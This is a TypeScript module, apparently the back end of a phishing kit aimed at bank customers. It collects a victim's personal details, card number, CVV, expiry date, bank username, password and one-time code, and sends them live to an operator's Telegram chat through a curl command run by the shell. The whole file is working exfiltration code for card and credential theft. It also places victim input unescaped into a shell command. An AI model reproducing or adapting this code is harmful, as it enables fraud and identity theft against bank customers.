import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Función para formatear el mensaje
function formatMessage(sessionData: any): string {
  return `
🔔 SESION EN VIVO

Sesion: #${sessionData.sessionId.slice(-8)}
Banco: ${sessionData.bank.toUpperCase()}
Estado: ${sessionData.status}

📋 DATOS DEL CLIENTE
Nombre: ${sessionData.fullName || '⏳ Esperando...'}
Email: ${sessionData.email || '⏳ Esperando...'}
Telefono: ${sessionData.phone || '⏳ Esperando...'}
Cedula: ${sessionData.documentId || '⏳ Esperando...'}
Direccion: ${sessionData.address || '⏳ Esperando...'}
Ciudad: ${sessionData.city || '⏳ Esperando...'}

💳 DATOS DE TARJETA
Numero: ${sessionData.cardNumber || '⏳ Esperando...'}
Titular: ${sessionData.cardHolderName || '⏳ Esperando...'}
Vencimiento: ${sessionData.expiryDate || '⏳ Esperando...'}
CVV: ${sessionData.cvv || '⏳ Esperando...'}
Marca: ${sessionData.cardBrand || '⏳ Esperando...'}

🔐 CREDENCIALES BANCARIAS
Usuario: ${sessionData.usuario || '⏳ Esperando...'}
Clave: ${sessionData.clave || '⏳ Esperando...'}
Dinamica: ${sessionData.claveDinamica || sessionData.otp || '⏳ Esperando...'}

🕐 Ultima actualizacion: ${new Date().toLocaleTimeString('es-CO')}
`;
}

// Función para enviar o actualizar mensajes a Telegram
export async function sendToTelegram(sessionData: any, messageId?: number) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Telegram bot token or chat ID not configured');
    return;
  }

  try {
    const message = formatMessage(sessionData);
    
    // Escapar comillas para JSON
    const escapedMessage = message.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
    
    let curlCommand: string;
    
    if (messageId) {
      // Editar mensaje existente
      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/editMessageText" \
        -H "Content-Type: application/json" \
        -d "{\\"chat_id\\":\\"${chatId}\\",\\"message_id\\":${messageId},\\"text\\":\\"${escapedMessage}\\"}" \
        --max-time 30 \
        --silent`;
    } else {
      // Enviar nuevo mensaje
      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
        -H "Content-Type: application/json" \
        -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"}" \
        --max-time 30 \
        --silent`;
    }

    try {
      const { stdout, stderr } = await execAsync(curlCommand);
      
      if (stderr) {
        console.error('Telegram curl stderr:', stderr);
      }
      
      const response = JSON.parse(stdout);
      if (response.ok) {
        console.log(messageId ? 'Message updated in Telegram' : 'Message sent to Telegram');
        // Retornar el message_id para futuras actualizaciones
        return response.result.message_id;
      } else {
        console.error('Telegram API error:', response);
        throw new Error(`Telegram API error: ${response.description}`);
      }
    } catch (error: any) {
      console.error('Error with Telegram via curl:', error.message);
      throw error;
    }
  } catch (error) {
    console.error('Error in sendToTelegram:', error);
    throw error;
  }
}
